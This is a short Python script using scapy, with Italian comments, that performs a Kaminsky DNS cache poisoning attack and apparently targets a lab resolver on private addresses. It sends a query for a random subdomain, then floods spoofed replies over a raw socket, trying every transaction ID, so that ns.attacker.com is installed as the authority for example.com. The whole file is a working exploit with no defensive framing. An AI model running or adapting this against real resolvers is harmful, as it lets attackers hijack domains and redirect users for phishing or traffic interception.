from scapy.all import *
import struct
import socket
import random
import string

target_dns = "10.9.0.53"
auth_dns = "10.9.1.153"
target_port = 33333

# 1. Generiamo un prefisso casuale per aggirare la cache
random_prefix = ''.join(random.choices(string.ascii_lowercase, k=5))
domain = f"{random_prefix}.example.com"

print(f"[*] 1. Sending trigger query for {domain}...")
trigger = IP(dst=target_dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=domain))
send(trigger, verbose=0)

print("[*] 2. Flooding spoofed KAMINSKY responses (Layer 2)...")
# PAYLOAD KAMINSKY:
# - ns: Inseriamo il nostro server falso come Autorità per l'intera zona
# - ar: Forniamo l'IP del nostro server falso (L'IP della macchina Attaccante)
base_pkt = (
    Ether(dst="ff:ff:ff:ff:ff:ff") /
    IP(src=auth_dns, dst=target_dns) /
    UDP(sport=53, dport=target_port, chksum=0) /
    DNS(id=0, qr=1, aa=1, 
        qd=DNSQR(qname=domain), 
        an=DNSRR(rrname=domain, type='A', ttl=86400, rdata="1.1.1.1"),
        ns=DNSRR(rrname="example.com", type='NS', ttl=86400, rdata="ns.attacker.com"),
        ar=DNSRR(rrname="ns.attacker.com", type='A', ttl=86400, rdata="10.9.0.10"))
)

raw_bytes = bytearray(raw(base_pkt))
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.bind(("eth0", 0))

# L'offset del Transaction ID (id) è sempre 42 
# (14 Ethernet + 20 IP + 8 UDP = 42)
for txid in range(0, 65535):
    struct.pack_into('!H', raw_bytes, 42, txid)
    s.send(raw_bytes)

print(f"[+] Kaminsky flood complete for {domain}!")
